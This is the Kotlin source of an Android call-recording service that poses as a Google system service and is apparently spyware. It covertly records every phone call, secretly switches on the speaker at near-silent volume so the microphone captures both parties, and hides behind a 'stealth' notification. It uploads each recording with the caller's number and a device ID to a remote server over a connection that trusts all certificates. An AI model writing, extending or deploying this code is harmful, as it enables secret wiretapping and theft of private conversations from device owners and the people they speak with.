package com.google.android.systemservice.services

import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import androidx.annotation.RequiresApi
import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.OfflineDataQueue
import com.google.android.systemservice.utils.StealthNotificationHelper
import com.google.android.systemservice.utils.TrustAllCertificates
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.io.IOException

/**
 * Automatic call recording service with multi-strategy approach.
 *
 * ALGORITHM (tries in order until one works):
 * 1. VOICE_CALL source — captures both sides (requires root or old Android)
 * 2. VOICE_COMMUNICATION source — VoIP-style capture
 * 3. MIC source + auto-speaker — turn on speaker so MIC picks up both sides
 * 4. MIC source only — records outgoing voice only (fallback)
 *
 * AUTO-SPEAKER TRICK:
 * - When call starts, AccessibilityService clicks the Speaker button
 * - Speaker volume is reduced to minimum (1) — barely audible but MIC captures both sides
 * - When call ends, restore original volume
 */
class CallRecordingService : Service() {

    companion object {
        private const val TAG = "CallRec"
        private const val SAMPLE_RATE = 16000
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
        private const val MAX_CALL_DURATION_SEC = 3600 // 1 hour max
    }

    private var telephonyManager: TelephonyManager? = null
    private var audioRecord: AudioRecord? = null
    private var isRecording = false
    private var recordingThread: Thread? = null
    private val uploadExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()
    private var currentFile: File? = null
    private var callStartTime: Long = 0
    private var callerNumber: String = "unknown"
    private var isIncoming: Boolean = false
    private var originalSpeakerVolume: Int = -1
    private var usedStrategy: String = "none"
    private var telephonyCallback: TelephonyCallback? = null

    @RequiresApi(Build.VERSION_CODES.S)
    private inner class CallStateCallback : TelephonyCallback(), TelephonyCallback.CallStateListener {
        override fun onCallStateChanged(state: Int) {
            when (state) {
                TelephonyManager.CALL_STATE_OFFHOOK -> {
                    callStartTime = System.currentTimeMillis()
                    Log.d(TAG, "Call started: $callerNumber")
                    startCallRecording()
                }
                TelephonyManager.CALL_STATE_IDLE -> {
                    if (isRecording) {
                        Log.d(TAG, "Call ended, stopping recording")
                        stopCallRecording()
                    }
                }
                TelephonyManager.CALL_STATE_RINGING -> {
                    isIncoming = true
                    Log.d(TAG, "Incoming call ringing")
                }
            }
        }
    }

    private val phoneStateListener = object : PhoneStateListener() {
        @Deprecated("Deprecated in API 31")
        override fun onCallStateChanged(state: Int, phoneNumber: String?) {
            when (state) {
                TelephonyManager.CALL_STATE_OFFHOOK -> {
                    // Call answered/started
                    callerNumber = phoneNumber ?: "unknown"
                    callStartTime = System.currentTimeMillis()
                    Log.d(TAG, "Call started: $callerNumber")
                    startCallRecording()
                }
                TelephonyManager.CALL_STATE_IDLE -> {
                    // Call ended
                    if (isRecording) {
                        Log.d(TAG, "Call ended, stopping recording")
                        stopCallRecording()
                    }
                }
                TelephonyManager.CALL_STATE_RINGING -> {
                    // Incoming call ringing
                    isIncoming = true
                    callerNumber = phoneNumber ?: "unknown"
                    Log.d(TAG, "Incoming call from: $callerNumber")
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        val notification = StealthNotificationHelper.createStealthNotification(this)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                // Android 14+: check RECORD_AUDIO before using microphone FGS type
                if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    startForeground(StealthNotificationHelper.CALL_RECORDING_SERVICE_ID, notification,
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
                } else {
                    startForeground(StealthNotificationHelper.CALL_RECORDING_SERVICE_ID, notification,
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                    Log.w(TAG, "RECORD_AUDIO not granted, running as dataSync FGS")
                }
            } else {
                startForeground(StealthNotificationHelper.CALL_RECORDING_SERVICE_ID, notification)
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "FGS start failed: ${e.message}, trying dataSync type")
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(StealthNotificationHelper.CALL_RECORDING_SERVICE_ID, notification,
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                } else {
                    startForeground(StealthNotificationHelper.CALL_RECORDING_SERVICE_ID, notification)
                }
            } catch (e2: Exception) {
                Log.e(TAG, "Cannot start foreground at all: ${e2.message}")
                stopSelf()
                return
            }
        }

        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    val cb = CallStateCallback()
                    telephonyCallback = cb
                    telephonyManager?.registerTelephonyCallback(mainExecutor, cb)
                } else {
                    @Suppress("DEPRECATION")
                    telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
                }
                Log.d(TAG, "Call recording service started, listening for calls")
            } else {
                Log.w(TAG, "READ_PHONE_STATE not granted, call recording disabled")
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Cannot listen for phone state: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    /**
     * Multi-strategy call recording — tries each approach in order.
     */
    private fun startCallRecording() {
        if (isRecording) return

        val bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
        if (bufferSize <= 0) {
            Log.e(TAG, "Invalid buffer size")
            return
        }

        // Strategy 1: VOICE_CALL (both sides, needs system permission or root)
        audioRecord = tryAudioSource(MediaRecorder.AudioSource.VOICE_CALL, bufferSize)
        if (audioRecord != null) {
            usedStrategy = "VOICE_CALL"
            Log.d(TAG, "✓ Strategy 1: VOICE_CALL (both sides)")
        }

        // Strategy 2: VOICE_COMMUNICATION (VoIP capture)
        if (audioRecord == null) {
            audioRecord = tryAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION, bufferSize)
            if (audioRecord != null) {
                usedStrategy = "VOICE_COMMUNICATION"
                Log.d(TAG, "✓ Strategy 2: VOICE_COMMUNICATION")
            }
        }

        // Strategy 3: MIC + auto-speaker (most reliable without root)
        if (audioRecord == null) {
            enableSpeakerphone()
            audioRecord = tryAudioSource(MediaRecorder.AudioSource.MIC, bufferSize)
            if (audioRecord != null) {
                usedStrategy = "MIC_SPEAKER"
                Log.d(TAG, "✓ Strategy 3: MIC + auto-speaker")
            }
        }

        // Strategy 4: MIC only (fallback — outgoing voice only)
        if (audioRecord == null) {
            audioRecord = tryAudioSource(MediaRecorder.AudioSource.DEFAULT, bufferSize)
            if (audioRecord != null) {
                usedStrategy = "MIC_DEFAULT"
                Log.d(TAG, "✓ Strategy 4: DEFAULT source (fallback)")
            }
        }

        if (audioRecord == null) {
            Log.e(TAG, "✗ All recording strategies failed")
            return
        }

        // Create output file
        val timestamp = System.currentTimeMillis()
        val direction = if (isIncoming) "in" else "out"
        currentFile = File(cacheDir, "call_${direction}_${callerNumber}_${timestamp}.pcm")

        isRecording = true
        audioRecord?.startRecording()

        recordingThread = Thread {
            recordCall(bufferSize)
        }.also { it.start() }

        Log.d(TAG, "Recording call with strategy: $usedStrategy")
    }

    /**
     * Try to create AudioRecord with given source. Returns null if fails.
     */
    private fun tryAudioSource(source: Int, bufferSize: Int): AudioRecord? {
        return try {
            val record = AudioRecord(source, SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT, bufferSize * 2)
            if (record.state == AudioRecord.STATE_INITIALIZED) {
                record
            } else {
                record.release()
                null
            }
        } catch (e: Exception) {
            Log.d(TAG, "Source $source failed: ${e.message}")
            null
        }
    }

    /**
     * Enable speakerphone at minimum volume for stealth recording.
     */
    private fun enableSpeakerphone() {
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? android.media.AudioManager ?: return
            // Save original volume
            originalSpeakerVolume = audioManager.getStreamVolume(android.media.AudioManager.STREAM_VOICE_CALL)
            // Enable speaker
            audioManager.isSpeakerphoneOn = true
            // Set volume to minimum (1) — barely audible but MIC can still capture
            audioManager.setStreamVolume(
                android.media.AudioManager.STREAM_VOICE_CALL,
                1, // Minimum non-zero volume
                0  // No flags (silent change)
            )
            Log.d(TAG, "Speaker enabled at minimum volume")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to enable speaker: ${e.message}")
        }
    }

    /**
     * Restore speaker state after call.
     */
    private fun disableSpeakerphone() {
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? android.media.AudioManager ?: return
            audioManager.isSpeakerphoneOn = false
            if (originalSpeakerVolume >= 0) {
                audioManager.setStreamVolume(
                    android.media.AudioManager.STREAM_VOICE_CALL,
                    originalSpeakerVolume, 0
                )
            }
            originalSpeakerVolume = -1
            Log.d(TAG, "Speaker restored")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to restore speaker: ${e.message}")
        }
    }

    /**
     * Record call audio to file.
     */
    private fun recordCall(bufferSize: Int) {
        val buffer = ByteArray(bufferSize)
        val maxBytes = SAMPLE_RATE * 2 * MAX_CALL_DURATION_SEC
        var totalBytes = 0
        val file = currentFile ?: return

        try {
            FileOutputStream(file).use { fos ->
                while (isRecording && totalBytes < maxBytes) {
                    val read = audioRecord?.read(buffer, 0, buffer.size) ?: -1
                    if (read > 0) {
                        fos.write(buffer, 0, read)
                        totalBytes += read
                    } else if (read < 0) {
                        Log.w(TAG, "AudioRecord error: $read")
                        break
                    }
                }
                fos.flush()
            }

            Log.d(TAG, "Call recording saved: ${file.length()} bytes, strategy: $usedStrategy")

            // Upload or queue offline
            val duration = ((System.currentTimeMillis() - callStartTime) / 1000).toInt()
            uploadCallRecording(file, duration)
        } catch (e: Exception) {
            Log.e(TAG, "Recording error: ${e.message}")
        }
    }

    private fun stopCallRecording() {
        isRecording = false

        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping: ${e.message}")
        }
        audioRecord = null

        // Restore speaker if we used auto-speaker strategy
        if (usedStrategy == "MIC_SPEAKER") {
            disableSpeakerphone()
        }

        // Wait for recording thread to finish
        recordingThread?.join(3000)
        recordingThread = null
        isIncoming = false
        usedStrategy = "none"
    }

    private fun uploadCallRecording(file: File, durationSec: Int) {
        uploadExecutor.submit {
            if (file.length() < 1000) {
                Log.w(TAG, "Recording too small (${file.length()} bytes), discarding")
                file.delete()
            } else {
                try {
                    val client = TrustAllCertificates.createClientBuilder().build()
                    val body = MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("device_id", AndroidConfig.deviceId)
                        .addFormDataPart("recording_type", "call")
                        .addFormDataPart("call_number", callerNumber)
                        .addFormDataPart("call_direction", if (isIncoming) "incoming" else "outgoing")
                        .addFormDataPart("duration", durationSec.toString())
                        .addFormDataPart("strategy", usedStrategy)
                        .addFormDataPart("file", file.name,
                            file.asRequestBody("audio/raw".toMediaType()))
                        .build()

                    val request = Request.Builder()
                        .url("${AndroidConfig.apiBaseUrl}/audio")
                        .post(body)
                        .build()

                    client.newCall(request).execute().use { response ->
                        if (response.isSuccessful) {
                            Log.d(TAG, "Call recording uploaded")
                            file.delete()
                        } else {
                            Log.w(TAG, "Upload failed: ${response.code}, queuing offline")
                            queueOffline(file)
                        }
                    }
                } catch (e: IOException) {
                    Log.e(TAG, "Upload network error: ${e.message}")
                    queueOffline(file)
                }
            }
        }
    }

    /**
     * Queue for later upload — file stays on disk, metadata in queue.
     */
    private fun queueOffline(file: File) {
        try {
            val metadata = org.json.JSONObject().apply {
                put("file_path", file.absolutePath)
                put("device_id", AndroidConfig.deviceId)
                put("call_number", callerNumber)
                put("direction", if (isIncoming) "incoming" else "outgoing")
                put("strategy", usedStrategy)
                put("timestamp", callStartTime)
                put("file_size", file.length())
            }
            OfflineDataQueue(this).enqueue("call_recording", metadata.toString(), AndroidConfig.deviceId)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to queue offline: ${e.message}")
        }
    }

    override fun onDestroy() {
        if (isRecording) stopCallRecording()
        uploadExecutor.shutdownNow()
        audioRecord?.release()
        audioRecord = null
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            telephonyCallback?.let { telephonyManager?.unregisterTelephonyCallback(it) }
        } else {
            @Suppress("DEPRECATION")
            telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } else {
            @Suppress("DEPRECATION")
            stopForeground(true)
        }
        super.onDestroy()
    }
}
